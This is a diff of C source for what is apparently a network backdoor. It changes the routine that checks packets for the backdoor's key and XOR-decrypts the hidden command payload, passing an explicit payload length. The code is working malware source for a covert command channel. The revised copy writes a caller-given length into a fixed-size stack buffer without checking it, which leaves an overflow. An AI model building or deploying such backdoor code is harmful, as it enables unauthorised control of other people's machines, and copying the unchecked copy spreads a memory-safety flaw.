@@ -76,10 +76,13 @@ char *bd_encrypt(char *plaintext){
 | - decrypt the hash
 | - remove header and footer
 | 
+| Notes:
+| - We must pass in the length of the payload because strlen doesnt suffice for
+|   raw bit data.
 | ------------------------------------------------------------------------------
 */
 
-char *bd_decrypt(char *payload){
+char *bd_decrypt(char *payload, int payload_len){
     printf("Decrypt payload: %s\n",payload);
     
     /* Check the packet for the key meant for the backdoor */
@@ -93,15 +96,17 @@ char *bd_decrypt(char *payload){
     
     /* Copy only encrypted portion of the payload to message */
     
+    int message_len = payload_len - BD_KEY_LEN;
     char message[BD_MAX_REPLY_LEN];
     memset(message, 0, BD_MAX_REPLY_LEN);
-    strcpy(message, payload + BD_KEY_LEN);
+    strncpy(message, payload + BD_KEY_LEN, message_len);
     printf("Message: %s\n", message);
     
     /* Decrypt message */
     
-    printf("message len: %d",strlen(message));
-    xor_encrypt(message, BD_ENCRYPT_KEY, strlen(message));
+    printf("message len: %d\n",strlen(message));
+    printf("message actual len: %d\n", message_len);
+    xor_encrypt(message, BD_ENCRYPT_KEY, message_len);
     
     /* Verify decryption succeeds by checking for header and footer */
     
